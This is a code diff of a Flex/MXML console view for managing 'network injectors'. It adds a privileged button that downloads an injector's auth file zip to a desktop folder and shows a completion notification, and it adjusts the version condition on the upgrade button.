@@ -11,12 +11,14 @@
   
   <s:Button label="{R.get('DELETE')}" click="onDeleteClick()" enabled="{Console.currentSession.user.is_sys_injectors() &amp;&amp; selectedObject != null}" icon="@Embed('/img/NEW/delete_32.png')"/>
   
+ 
+  
   <actionbar:Separator width="40"/>
-
+  <s:Button label="{R.get('NIA_AUTH_GET')}" click="getAuthFile()"  enabled="{Console.currentSession.user.is_sys_injectors() &amp;&amp; selectedObject != null}" icon="@Embed('/img/NEW/unlock32.png')"/>
   <s:Button label="{R.get('UPGRADE')}" click="upgradeNI(event)"
             icon="@Embed('/img/NEW/update.png')"
-            enabled="{selectedObject != null &amp;&amp; (selectedObject as Injector).poll &amp;&amp; Console.currentSession.user.is_sys_injectors() &amp;&amp; (selectedObject as Injector).version>=2014012001}"/>
-  
+            enabled="{selectedObject != null &amp;&amp; Console.currentSession.user.is_sys_injectors() &amp;&amp; (selectedObject as Injector).version >= 2014120801}"/>
+ 
   <s:Spacer width="100%"/>
   
   <s:TextInput id="searchInput" keyUp="onKeyUp(event)"/>
@@ -25,13 +27,16 @@
     <![CDATA[
       import it.ht.rcs.console.network.controller.InjectorManager;
       import it.ht.rcs.console.network.model.Injector;
+      import it.ht.rcs.console.notifications.NotificationPopup;
       import it.ht.rcs.console.utils.AlertPopUp;
+      import it.ht.rcs.console.utils.FileDownloader;
       
       import locale.R;
       
       import mx.events.CloseEvent;
       import mx.managers.PopUpManager;
 
+      private var fileDownloader:FileDownloader
       
       private function onNewClick():void
       {
@@ -44,6 +49,28 @@
         var popup:EditNIAForm = PopUpManager.createPopUp(this.parentDocument as DisplayObject, EditNIAForm, true) as EditNIAForm;
         popup.injector = selectedObject as Injector;
         PopUpManager.centerPopUp(popup);
+      }
+      
+      private function getAuthFile():void
+      {
+        // downloads are stored into /Desktop/RCS Downloads 
+        var path:String = File.desktopDirectory.nativePath + '/RCS Downloads';
+        new File(path).createDirectory();
+        
+        // start the downloader
+        var remote_uri:String = 'injector/auth_file/' + selectedObject._id;
+        var local_path:String = path + '/' + selectedObject.name+"_auth_file.zip";
+        fileDownloader = new FileDownloader(remote_uri, local_path);
+        //fileDownloader.onProgress = onDownloadUpdate;
+        fileDownloader.onComplete = onDownloadComplete;
+        fileDownloader.download();
+      }
+      
+      public function onDownloadComplete():void
+      {
+        var message:String=selectedObject.name+"_auth_file.zip "+R.get('DOWNLOADED_TO')+ ' /RCS Downloads'
+        NotificationPopup.showNotification(message,5)
+        //NotificationPopup.showNotification(R.get('DOWNLOAD_COMPLETE'),3)
       }
       
       private function onDeleteClick():void
